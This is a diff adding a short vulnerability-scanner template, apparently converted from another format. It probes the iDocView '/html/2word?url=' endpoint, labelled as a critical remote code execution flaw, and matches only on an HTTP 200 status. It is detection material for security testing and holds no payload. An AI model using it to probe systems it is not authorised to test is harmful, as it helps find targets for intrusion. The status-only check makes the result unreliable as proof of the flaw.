@@ -1,0 +1,17 @@
+id: yaml-poc-idocv-idocview-rce-CT-827723
+info:
+  name: Yaml Poc Idocv Idocview Rce Ct 827723
+  author: yang.lei
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-idocv-idocview-rce-CT-827723'
+  tags: rce
+  reference: []
+http:
+- method: GET
+  path:
+  - /html/2word?url={{filename}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
